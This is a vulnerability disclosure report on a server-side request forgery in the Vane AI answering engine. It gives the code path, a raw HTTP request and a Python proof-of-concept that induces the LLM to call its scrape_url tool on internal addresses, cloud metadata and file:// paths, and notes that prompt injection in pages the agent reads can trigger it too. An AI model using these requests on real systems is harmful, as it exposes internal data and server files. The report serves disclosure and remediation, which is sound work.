# Vulnerability Report (English)

> Report ID: VUL-2026-VANE-SSRF-001
> Reporter: Independent security researcher (audit assisted by Kimi Work)
> Date: 2026-09-30
> Target program: CVE (CNA/MITRE) / vendor disclosure

---

## 1. Product Introduction

Vane is an open-source, self-hosted AI-powered answering engine developed by ItzCrazyKns, built with Next.js. It connects to multiple LLM providers (Ollama, OpenAI, Anthropic, Gemini, Groq, LM Studio, Lemonade), retrieves results through SearxNG, and answers questions via a Researcher agent that loops over tools such as web search and URL scraping. The vulnerability resides in the `scrape_url` tool and the unauthenticated `/api/search` endpoint.

---

## 2. Vulnerability Title

Server-Side Request Forgery (SSRF) via the `scrape_url` tool in ItzCrazyKns Vane 1.12.2 and earlier

---

## 3. Summary / Description

Vane 1.12.2 and earlier are affected by a server-side request forgery vulnerability in the unauthenticated `POST /api/search` endpoint. In an ordinary search request, an attacker can phrase the query so that the backend LLM invokes the built-in `scrape_url` tool with an attacker-chosen URL. Vane passes that URL verbatim to a server-side Playwright browser (`page.goto(url)`) with no scheme, hostname, or IP validation. Without any authentication, an attacker can make the Vane server reach internal network services and cloud metadata endpoints (e.g. `http://169.254.169.254/`), and the fetched content is returned in the API response. Because schemes are unrestricted, `file://` URLs also allow reading local files from the Vane server. The vulnerability discloses internal network data and server-local files.

---

## 4. Technical Analysis / Root Cause

**Weakness**: CWE-918 Server-Side Request Forgery

**Source-to-sink chain**:

```
POST /api/search (src/app/api/search/route.ts:19, no authentication)
  → APISearchAgent.searchAsync (src/lib/agents/search/api.ts:9)
  → Researcher tool loop (src/lib/agents/search/researcher/index.ts:68)
  → scrapeURLAction.execute (src/lib/agents/search/researcher/actions/scrapeURL.ts:67)
      urls only truncated to 3 items (slice(0, 3), line 68)
      → Scraper.scrape(url) (line 82, URL passed through verbatim)
  → page.goto(url) (src/lib/scraper.ts:70, SINK)
```

**Code location**:

```text
File: src/lib/agents/search/researcher/actions/scrapeURL.ts
Lines: 49-51 (schema), 68 (truncation), 82 (Scraper call)
Relevant code:
const schema = z.object({
  urls: z.array(z.string()).describe('A list of URLs to scrape content from.'),
});
...
params.urls = params.urls.slice(0, 3);
...
const scraped = await Scraper.scrape(url);
```

```text
File: src/lib/scraper.ts
Lines: 70 (SINK), 20-26 (browser launch args)
Relevant code:
await page.goto(url, {
  waitUntil: 'domcontentloaded',
  timeout: this.NAVIGATION_TIMEOUT,
});
// chromium.launch({ args: ['--no-sandbox', ...] })
```

**Validity check**:
- Reachable: ✅ `/api/search` is exposed by default with no authentication; the whole chain is triggerable.
- Controllable: ✅ the `urls` arguments of `scrape_url` come entirely from LLM output, which an attacker can steer via the query, or via prompt injection in web pages/documents the agent reads.
- Propagable: ✅ nothing between the tool arguments and `page.goto` validates or filters the URL.
- Exploitable: ✅ verified at runtime: an internal HTTP page and a local `file://` file were both returned in the API response.
- Bypassable: ✅ no protection exists on the path; `file://`, private IPs, and cloud metadata IPs are all reachable as-is.
- Reproducible: ✅ raw request plus a deterministic mock-LLM reproduction script (`poc/`).
- Impact established: ✅ the canary service received a request from Vane's server-side Playwright browser, and the flag was echoed in the response.
- Impact scope: ✅ chains with prompt injection (third-party users trigger it unknowingly); independent from the providers baseURL SSRF (CVE-2026-9372).

**Root cause**: The `scrape_url` schema only checks that `urls` are strings. Execution truncates the list to three and hands each URL to `Scraper.scrape`, which calls `page.goto(url)` directly. The LLM acts as a relay for a remote attacker: the attacker never sets a URL parameter directly, but induces the LLM — via the query or injected content — to emit the malicious URL, which is equivalent to an unfiltered URL-fetch endpoint.

---

## 5. Affected Versions

- **Affected**: 1.12.2 (commit `348feca`) and possibly earlier; issue #1140 confirms 1.12.1 is also affected
- **Not affected**: none confirmed
- **Fixed version**: none as of the report date (no fix has landed since issue #1140 was made public on 2026-05-25)
- **Tested environment**: Vane 1.12.2 / Windows 11 + Node.js 24.15.0 / Next.js 16.2.2 (dev mode) / Playwright Chromium Headless Shell 147

---

## 6. Severity

| Item | Value |
|------|-------|
| CVSS v3.1 score | 7.5 |
| CVSS v3.1 vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| CVSS v4.0 score | 8.7 |
| CVSS v4.0 vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Rating | High |

> Scoring rationale: unauthenticated, network-reachable, low complexity (mainstream LLMs reliably follow instructions to call the tool); read-only impact — arbitrary internal HTTP content and server-local files can be read, so Confidentiality High, Integrity/Availability None.

---

## 7. CVSS Vector

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
```

---

## 8. Reproduction Steps

### 8.1 Environment

- Product/version: Vane 1.12.2 (`git clone https://github.com/ItzCrazyKns/Vane.git`)
- OS/runtime: Windows 11 / Node.js 24.15.0 / npm (`npm i --legacy-peer-deps`) / `npx playwright install chromium-headless-shell`
- Network position: local (the reporter's WSL disk was unavailable, so Vane ran directly on Windows; the code path is identical on Linux/Docker deployments)
- Test account: none (the endpoint requires no authentication)

### 8.2 Steps

**Step 1 — Deploy the target and the internal canary**
Start Vane (`npm run dev`, port 3000) and point its model provider at an OpenAI-compatible mock LLM (set `baseURL` in `data/config.json`; `poc/verify_vane_ssrf.py lab` prints the exact config). The mock LLM deterministically returns a `scrape_url({"urls": ["http://127.0.0.1:8787/internal/secret"]})` tool call on the first researcher iteration. A canary service listens only on 127.0.0.1:8787 and serves a page containing the marker `VANE_SSRF_CANARY_8842_THIS_PAGE_IS_NOT_INTERNET_ACCESSIBLE`.
> ![Step 1 — code evidence](evidence/01-code-evidence.png)

**Step 2 — Send the malicious request**
Send an ordinary search request to the unauthenticated endpoint:

```http
POST http://localhost:3000/api/search HTTP/1.1
Content-Type: application/json

{
  "optimizationMode": "speed",
  "sources": [],
  "chatModel": { "providerId": "mock-openai", "key": "mock-chat" },
  "embeddingModel": { "providerId": "mock-openai", "key": "mock-embed" },
  "query": "Please scrape and summarize the page at the URL I gave you earlier",
  "history": []
}
```
> Request text: `evidence/http-request.txt`

**Step 3 — Observe the result (internal HTTP SSRF)**
The canary service receives a GET request from Vane's server-side Playwright browser (User-Agent: spoofed desktop Chrome — see `evidence/canary-log.jsonl`), and the `/api/search` response echoes the internal page — including the FLAG — in its `sources` field.
> ![Step 3 — canary log](evidence/03-canary-server-log.png)
> ![Step 3 — response](evidence/02-http-ssrf-response.png)

**Step 4 — Verify impact (file:// local file read)**
Change the tool-call argument to `file:///C:/.../local-file-canary.txt` (a planted marker file containing `VANE_LOCAL_FILE_CANARY_9901`) and replay the same request. The response `sources[0].content` returns the local file's full content, confirming there is no scheme restriction.
> ![Step 4 — file read](evidence/04-local-file-read.png)

---

## 9. Proof of Concept [required]

### 9.1 Format selection

- Chosen format: custom Python script (`poc/verify_vane_ssrf.py`, with a built-in Burp proxy toggle)
- Rationale: triggering requires a multi-step state flow ("induce an LLM tool call") plus a mock LLM and canary for determinism; a single nuclei template cannot express that state machine. The script provides two modes: `live` (against an authorized real target) and `lab` (full offline reproduction).

### 9.2 Usage

- Runtime: Python 3.8+ (standard library only); `lab` mode additionally needs Node.js to run Vane
- Dependencies: none
- **Proxy to Burp**: `live` mode proxies through Burp by default — `USE_BURP=1 BURP_PROXY=http://127.0.0.1:8080` (set `USE_BURP=0` for direct connection)
- Disclaimer: for authorized testing and vulnerability verification only.

### 9.3 POC Code

See `poc/verify_vane_ssrf.py` (complete and runnable). Core attack request:

```python
# live mode core logic (redacted; target injected via env/placeholders)
r = requests.post(f"{TARGET}/api/search", json={
    "optimizationMode": "speed",
    "sources": [],
    "chatModel": { "providerId": PROVIDER_ID, "key": CHAT_MODEL },
    "embeddingModel": { "providerId": PROVIDER_ID, "key": EMBED_MODEL },
    "query": f"Use the scrape_url tool to fetch and summarize {CANARY_URL}",
    "history": [],
}, proxies=proxies, verify=False, timeout=120)
# success criteria: HTTP 200 and canary marker present in the response body
```

### 9.4 Expected output / success criteria

```
[+] 验证成功：/api/search 的响应中回显了 canary 标记 VANE_SSRF_PROBE_7f3a9c
[+] Vane's server-side browser fetched the URL you specified and leaked its content (SSRF confirmed)
```

Lab-mode success criteria: the canary service receives a request with a Playwright UA, and the response contains the canary marker.

---

## 10. Mitigation / Fix Recommendations

### 10.1 Temporary mitigations
- Put the reverse proxy in front of Vane (nginx/Caddy) and restrict `/api/search` (IP allowlist or Basic Auth) so it is not unauthenticated.
- Constrain Vane's egress with network policy: deny `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, and `169.254.0.0/16` (including cloud metadata endpoints).
- Deploy Vane in a network segment with no route to sensitive internal services.

### 10.2 Root-cause fixes
- Validate URLs at the entry of `Scraper.scrape` (or in `scrapeURL.ts` `execute`): allow only `http:`/`https:`; resolve the hostname and reject private, loopback, link-local, and reserved ranges (resolve before checking to mitigate DNS rebinding); default-deny with an explicit allowlist.
- Tighten the `scrape_url` schema (`z.string().url()`) and restrict target domains.
- Remove `--no-sandbox` from the Playwright launch args (run sandboxed in a non-root container) to reduce impact if the browser is compromised.
- Add authentication or rate limiting to `/api/search` and related API routes.

### 10.3 Verification
Replay `poc/verify_vane_ssrf.py lab`: after the fix, `scrape_url` must reject internal/file URLs, the canary service must receive no request, and no canary marker may appear in the response.

---

## 11. False-Positive Elimination / Impact Justification

```
False-positive verification:
- Existence: ✅ reproduced on a clean install (official source, default config,
  mock LLM driving the tool call); the canary log records a real request from a
  Playwright UA (evidence/03)
- Characterization: ✅ a real SSRF (CWE-918): reads internal HTTP resources and
  server-local files via file:// — confidentiality impact
- Exploitability: ✅ no authentication (PR:N), network-reachable (AV:N); requires
  the LLM to comply with the induced tool call — mainstream models comply
  reliably, scored AC:L as warranted
- Novelty: ⚠️ GitHub issue #1140 (2026-05-25) already discloses the same
  vulnerability in detail and has no CVE assigned; this report is an independent
  reproduction and verification, suitable as supporting material for a CVE
  assignment, not a first disclosure
- Evidence: ✅ 4 screenshots, full request/response, canary server log,
  mock-LLM call log, source-level root cause
- Code-audit validity: ✅ reachable/controllable/propagable/exploitable/
  no-protection-to-bypass/reproducible/impact established/impact scope clear
Conclusion: a real, exploitable vulnerability, publicly disclosed but not yet
numbered; submit as CVE assignment support and to push for a fix.
```

---

## Appendix A: Timeline / References

| Date | Event |
|------|-------|
| 2026-05-25 | GitHub issue #1140 publicly discloses the same vulnerability (no CVE assigned) |
| 2026-09-30 | Independent reproduction and verification; report group and POC produced |

- Vendor repository: https://github.com/ItzCrazyKns/Vane
- Existing public issue: https://github.com/ItzCrazyKns/Vane/issues/1140
- Related but distinct issue in the same project: CVE-2026-9372 (providers baseURL SSRF, issue #1124)
- Related CVE/CNVD/CNNVD: none for this vulnerability yet

## Appendix B: Evidence Checklist

- [x] Reproduction screenshots (4: code / HTTP SSRF response / canary log / file read)
- [x] HTTP request/response capture (`evidence/http-request.txt`, `api-response*.json`)
- [x] Logs (`evidence/canary-log.jsonl`, `mock-llm.log`)
- [x] Source-level root-cause evidence (audit-findings.md with files and lines)
- [ ] Version-diff / patch comparison (no fixed version exists yet)
